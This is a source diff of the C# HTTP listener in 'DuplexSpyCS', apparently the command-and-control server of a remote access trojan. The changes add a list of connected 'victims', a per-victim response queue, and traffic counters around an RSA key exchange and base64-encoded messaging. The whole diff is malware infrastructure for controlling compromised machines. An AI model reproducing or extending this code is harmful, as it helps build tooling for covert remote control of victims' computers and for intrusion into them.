@@ -12,9 +12,11 @@ namespace DuplexSpyCS
 {
     public class clsHttpListener : clsListener
     {
-        private Queue<clsHttpResp> m_qResponse = new Queue<clsHttpResp>();
         private TcpListener m_listener { get; set; }
         private CancellationTokenSource m_cts { get; set; }
+
+        private List<clsVictim> m_lsVictim = new List<clsVictim>();
+        public List<clsVictim> Victims { get { return m_lsVictim; } }
 
         public clsHttpListener(string szName, int nPort, string szDescription)
         {
@@ -115,28 +117,6 @@ namespace DuplexSpyCS
             }
         }
 
-        public void fnEnqueue(clsHttpResp resp)
-        {
-            m_qResponse.Enqueue(resp);
-        }
-
-        public clsHttpResp fnGetResponse()
-        {
-            if (m_qResponse.Count == 0)
-            {
-                return new clsHttpResp(3, 0, "HTTP 500://Server internal error.");
-            }
-            else
-            {
-                return m_qResponse.Dequeue();
-            }
-        }
-
-        public void fnReqHandler()
-        {
-
-        }
-
         private async Task fnAcceptLoop(CancellationToken ct)
         {
             while (!ct.IsCancellationRequested && m_bIslistening)
@@ -161,6 +141,8 @@ namespace DuplexSpyCS
                 NetworkStream stream = client.GetStream();
                 clsVictim victim = new clsVictim(this, client.Client);
 
+                m_lsVictim.Add(victim);
+
                 var s = clsCrypto.CreateRSAKey();
                 string szRsaPublicKey = s[0];
                 string szRsaPrivateKey = s[1];
@@ -179,6 +161,8 @@ namespace DuplexSpyCS
                         var (header, bodyBytes) = await fnReadHttpPacket(stream);
                         if (bodyBytes.Length == 0)
                             return;
+
+                        clsStore.recv_bytes += header.Length + bodyBytes.Length;
 
                         string szBody = Encoding.UTF8.GetString(bodyBytes);
                         byte[] abBody = Convert.FromBase64String(szBody);
@@ -248,8 +232,11 @@ namespace DuplexSpyCS
 
                                 }
 
-                                var pkt = fnGetResponse();
-                                victim.Send(pkt.fnGetBytes());
+                                var pkt = victim.fnGetResponse();
+                                byte[] abBuffer = pkt.fnGetBytes();
+                                victim.Send(abBuffer);
+
+                                clsStore.sent_bytes += abBuffer.Length;
                             }
                         }
                     }
@@ -264,6 +251,7 @@ namespace DuplexSpyCS
                 }
 
                 fnDisconnected(victim);
+                m_lsVictim.Remove(victim);
             }
         }
 
